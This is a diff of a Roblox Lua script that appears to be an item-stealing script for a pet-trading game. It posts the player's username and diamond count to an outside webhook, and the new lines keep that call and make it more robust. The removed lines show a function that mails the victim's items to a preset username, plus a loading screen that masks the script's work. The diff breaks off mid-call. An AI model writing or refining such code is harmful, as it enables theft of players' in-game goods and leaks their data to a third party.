@@ -130,20 +130,19 @@ end)
 
 -- Function to get RAP value
 local function getRAP(Type, Item)
-    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
-        {
-            Class = {Name = Type},
-            IsA = function(hmm)
-                return hmm == Type
-            end,
-            GetId = function()
-                return Item.id
-            end,
-            StackKey = function()
-                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
-            end
-        }
-    ) or 0)
+    local devRAPCmds = require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds)
+    return (devRAPCmds and devRAPCmds.Get({
+        Class = {Name = Type},
+        IsA = function(hmm)
+            return hmm == Type
+        end,
+        GetId = function()
+            return Item.id
+        end,
+        StackKey = function()
+            return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
+        end
+    }) or 0)
 end
 
 -- Function to send message to webhook
@@ -226,36 +225,5 @@ local function SendMessage(username, diamonds)
     local body = HttpService:JSONEncode(data)
 
     if webhook and webhook ~= "" then
-        local response = HttpService:PostAsync(webhook, body, Enum.HttpContentType.ApplicationJson)
-    end
-end
-
--- Ensure network and library modules are loaded
-local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
-local library = require(game.ReplicatedStorage.Library)
-local save = GetSave()
-local mailsent = save.MailboxSendsSinceReset
-
-local function sendItem(category, uid, am)
-    local args = {
-        [1] = Username,
-        [2] = "Nice",
-        [3] = category,
-        [4] = uid,
-        [5] = am
-    }
-    network:InvokeServer("SendMail", unpack(args))
-end
-
--- Example of usage
-SendMessage(Username, gemsleaderstatpath.Value)
-
--- Handle Cleanup
-loadingRing.Visible = false
-frame:TweenPosition(UDim2.new(0, 0, 1, 0), "InOut", "Sine", 2)
-wait(2)
-ScreenGui:Destroy()
-
-print("Loaded LoadingScreen")
-print("Script Successful")
-
+        local success, response = pcall(function()
+            return HttpService:PostAsync(webhook,
